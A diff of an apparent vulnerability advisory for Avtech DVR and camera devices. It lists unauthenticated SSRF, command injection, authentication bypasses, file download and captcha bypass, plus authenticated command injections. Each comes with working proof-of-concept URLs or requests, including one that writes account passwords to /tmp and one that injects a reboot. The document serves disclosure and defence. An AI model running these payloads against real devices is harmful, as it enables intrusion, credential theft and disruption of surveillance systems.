@@ -25,61 +25,98 @@ POC:
 Example response:
 
 `Firmware.Version=1011-1005-1008-1002`
+
 `MACAddress=00:0E:53:xx:xx:xx`
+
 `Product.Type=DVR`
+
 `Product.ID=308B`
+
 `Product.ShortName=V_full_Indep,V_Multistream`
+
 `Video.System=PAL`
+
 `Audio.DownloadFormat=ULAW`
+
 `Video.Input.Num=8`
+
 `Video.Output.Num=1`
+
 `Video.Format=H264,MJPEG`
+
 `Video.Format.Default=H264`
+
 `Video.Resolution=4CIF,CIF`
+
 `Video.Quality=BEST,HIGH,NORMAL,BASIC`
+
 `Video.Local.Input.Num=8`
+
 `Video.Local.Output.Num=1`
+
 `Video.Local.Format=H264,MJPEG`
+
 `Audio.Input.Num=8`
+
 `Audio.Output.Num=1`
+
 `Audio.Format=ULAW`
+
 `Audio.Local.Input.Num=8`
+
 `Audio.Local.Output.Num=1`
+
 `Audio.Local.Format=PCM`
+
 `Language.Default=ENGLISH`
+
 `Language.Support=ENGLISH&CHINESE&JAPANESE&FRANCE&GERMAN&SPANISH&PORTUGUESE&ITALIAN&TURKISH&POLISH&RUSSIAN&CUSTOMIZE&THAI
 &VIETNAM&DUTCH&GREEK&ARABIC&CZECH&HUNGARIAN&HEBREW&CHINA&`
-`Capability=D0,80,A,80
-PushNotify.MaxChannel=8`
+
+`Capability=D0,80,A,80`
+
+`PushNotify.MaxChannel=8`
 
 ### 4) Unauthenticated SSRF in DVR devices ###
 In case of DVR devices, Search.cgi can be accessed without authentication. This service is responsible for searching and accessing IP cameras in the local network. In newer firmware versions, Search.cgi provides the cgi_query action, which performs an HTTP request with the specified parameters. By modifying the ip, port and queryb64str parameters, an attacker is able to perform arbitrary HTTP requests through the DVR device without authentication.
+
 POC: 
+
 `http://<device_ip>/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==`
 
 ### 5) Unauthenticated command injection in DVR devices ###
 The cgi_query action in Search.cgi performs HTML requests with the wget system command, which uses the received parameters without sanitization or verification. By exploiting this issue, an attacker can execute any system command with root privileges without authentication.
+
 POC:
+
 `http://<device_ip>/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=LW==&username=admin%20;XmlAp%20r%20Account.User1.Password>$(ps|grep%20Search.cgi|grep%20-v%20grep|head%20-n%201|awk%20'{print%20"/tmp/"$1".log"}');&password=admin`
 
 ### 6) Authentication bypass #1 ###
 Video player plugins are stored as .cab files in the web root, which can be accessed and downloaded without authentication. The cab file request verification in the streamd web server is performed with the strstr function, which means that a request should not be authenticated if it contains the “.cab” string anywhere in the URL. We note that some of the models contain an additional check in the CgiDaemon, which allows unauthenticated cgi access only under the /cgi-bin/nobody folder.
+
 POC: 
+
 `http://<device_ip>/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*`
 
 ### 7) Authentication bypass #2 ###
 Cgi scripts in the /cgi-bin/nobody folder can be accessed without authentication (e.g. for login). The streamd web server verifies whether the request can be performed without authentication by searching for the “/nobody” string in the URL with  the strstr function. Thus, if a request contains the "/nobody" string anywhere in the URL, it does not have to be authenticated. We note that some of the models contain an additional check in the CgiDaemon, which allows unauthenticated cgi access only under the /cgi-bin/nobody folder.
+
 POC: 
+
 `http://<device_ip>/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*`
 
 ### 8) Unauthenticated file download from web root ###
 If a cab file is requested, the web server sends the file without processing it. Because the streamd web server verifies the cab file request by searching for the “.cab” string in the URL with the strstr function, any file (even the cgi scripts) in the web root can be downloaded without authentication.
+
 POC: 
+
 `http://<device_ip>/cgi-bin/cgibox?.cab`
 
 ### 9) Login captcha bypass #1 ###
 To prevent brute-forcing attempts, Avtech devices require a captcha for login requests. However, if the login requests contain the login=quick parameter, the captcha verification is bypassed.
+
 POC: 
+
 `http://<device_ip>/cgi-bin/nobody/VerifyCode.cgi?account=<b64(username:password)>&login=quick`
 
 ### 10) Login captcha bypass #2 ###
@@ -87,23 +124,33 @@ Instead of using a random session ID, Avtech devices use the base64-encoded user
 
 ### 11) Authenticated command injection in CloudSetup.cgi ###
 Devices that support the Avtech cloud contain CloudSetup.cgi, which can be accessed after authentication. The exefile parameter of a CloudSetup.cgi request specifies the system command to be executed. Since there is no verification or white list-based checking of the exefile parameter, an attacker can execute arbitrary system commands with root privileges.
+
 POC: 
+
 `http://<device_ip>/cgi-bin/supervisor/CloudSetup.cgi?exefile=ps`
 
 ### 12) Authenticated command injection in adcommand.cgi ###
 Some of the Avtech devices contain adcommand.cgi to perform ActionD commands. The adcommand.cgi can be accessed after authentication. In newer devices the ActionD daemon provides the DoShellCmd function, which performs a system call with the specified parameters. Since there is no verification or white list-based checking of the parameter of the DoShellCmd function, an attacker can execute arbitrary system commands with root privileges.
+
 POC: 
+
 `POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1`
+
 `Host: <device_ip>`
+
 `Content-Length: 23`
+
 `Cookie: SSID=YWRtaW46YWRtaW4=`
+
 
 `DoShellCmd "strCmd=ps&"`
 
 ### 13) Authenticated command injection in PwdGrp.cgi ###
 The PwdGrp.cgi uses the username, password and group parameters in a new user creation or modification request in a system command without validation or sanitization. Thus and attacker can execute arbitrary system commands with root privileges.
 We are aware that this vulnerability is being exploited in the wild!
+
 POC: 
+
 `http://<device_ip>/cgi-bin/supervisor/PwdGrp.cgi?action=add&user=test&pwd=;reboot;&grp=SUPERVISOR&lifetime=5%20MIN`
 
 ### 14) HTTPS used without certificate verification ###
